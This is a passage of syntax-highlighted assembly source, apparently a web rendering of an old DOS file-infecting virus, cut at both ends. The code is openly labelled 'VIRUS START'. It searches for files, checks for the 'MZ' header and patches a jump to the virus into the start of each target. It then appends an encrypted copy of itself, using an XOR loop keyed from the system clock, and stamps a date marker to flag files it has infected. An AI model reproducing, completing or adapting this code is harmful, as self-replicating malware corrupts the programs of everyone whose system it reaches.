</span><span class="sc5">Bx_r</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">37h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">13h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">16h</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">18h</span><span class="sc4">,</span><span class="sc2">0bbh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">1bh</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">1dh</span><span class="sc4">,</span><span class="sc2">0fbh</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc5">gkey</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">8h</span><span class="sc4">,</span><span class="sc8">Dl</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">0bh</span><span class="sc4">,</span><span class="sc8">Dh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">0eh</span><span class="sc4">,</span><span class="sc8">Dh</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Dh</span><span class="sc4">,</span><span class="sc8">Dl</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">14h</span><span class="sc4">,</span><span class="sc8">Dh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Si</span><span class="sc4">]+</span><span class="sc2">17h</span><span class="sc4">,</span><span class="sc8">Dh</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">

</span><span class="sc1">;**************************************************** VIRUS START *************</span><span class="sc0">
</span><span class="sc5">Virus</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">vir</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc0">
</span><span class="sc5">find_f</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">  
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ok</span><span class="sc0">
</span><span class="sc5">find_n</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">ok</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">chk</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">dg</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">chk</span><span class="sc0">
</span><span class="sc5">dg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">]+</span><span class="sc5">dir</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">fg</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rt</span><span class="sc0">
</span><span class="sc5">fg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">]+</span><span class="sc5">dir</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_f</span><span class="sc0">

</span><span class="sc5">chk</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">]+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">date</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01e0h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01a0h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">find_n</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">]+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dlina</span><span class="sc4">,</span><span class="sc2">62000d</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">find_n</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">]+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dlina</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">find_n</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0"> 
    </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">02bh</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">]+</span><span class="sc5">dir</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">nam</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">nam</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">nam</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00dh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">]+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">atrib</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Ch</span><span class="sc4">,</span><span class="sc8">Ch</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0fffeh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">]+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dlina</span><span class="sc0"> </span><span class="sc1">;====lengh of file to AX</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">]+</span><span class="sc2">1h</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_j</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;==========new JMP to virus</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">               
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                   
    </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">ar</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rt</span><span class="sc0">
</span><span class="sc5">ar</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">buf_j</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buf_j</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">
    </span><span class="sc6">Jnz</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">find_n</span><span class="sc0">
</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">virn</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">22h</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">seg_new</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">cod2_lng</span><span class="sc0">
    </span><span class="sc6">Rep</span><span class="sc0"> </span><span class="sc6">Movsb</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4000h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">new_j</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc1">;──────────────────────────────────┐</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">  </span><span class="sc1">;       \
    Int 21h ;        \
    Push    Ds  ;         \
    Mov Cx,Cod2_Lng /2d ;      \
    Mov Si,41h      ;   \
    Mov Es:[23h],Dx ;        \
My:             ;         &gt;---------&gt; 1-я Зашифровка </span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc8">Dx</span><span class="sc0"> </span><span class="sc1">;    /</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">          </span><span class="sc1">;   /</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0DEADh</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">         </span><span class="sc1">;   /</span><span class="sc0">
    </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">My</span><span class="sc0">        </span><span class="sc1">;   /</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────┘</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">]+</span><span class="sc5">n_com</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">Mul</span><span class="sc0"> </span><span class="sc8">Bl</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">d_dlina</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">M1</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">
    </span><span class="sc6">MovSb</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dlina</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">107h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">I1</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Cld</span><span class="sc0">
    </span><span class="sc6">MovSw</span><span class="sc0">
    </span><span class="sc6">MovSb</span><span class="sc0">
    </span><span class="sc6">MovSw</span><span class="sc0">
    </span><span class="sc6">MovSw</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc5">lng</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc8">Si</span><span class="sc4">],</span><span class="sc8">Bl</span><span class="sc0">
</span><span class="sc1">;-------------------------------    </span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">gat</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">5fdh</span><span class="sc0">
    </span><span class="sc6">MovSb</span><span class="sc0">
    </span><span class="sc6">MovSw</span><span class="sc0">
    </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc0">
    </span><span class="sc6">MovSb</span><span class="sc0">
    </span><span class="sc6">MovSw</span><span class="sc0">
    </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">I1</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">61bh</span><span class="sc0">
    </span><span class="sc6">MovSw</span><span class="sc0">
    </span><span class="sc6">MovSb</span><span class="sc0">
    </span><span class="sc6">MovSw</span><span class="sc0">
    </span><span class="sc6">MovSw</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">Inc</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc0">
    </span><span class="sc6">MovSw</span><span class="sc0">   
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Cld</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">cody</span><span class="sc4">+[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">
</span><span class="sc5">dry</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">

    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4000h</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                   
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">cod2_lng</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">22h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4000h</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                   
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">]+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">time</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">Bp</span><span class="sc4">]+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">date</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">65055d</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01a0h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
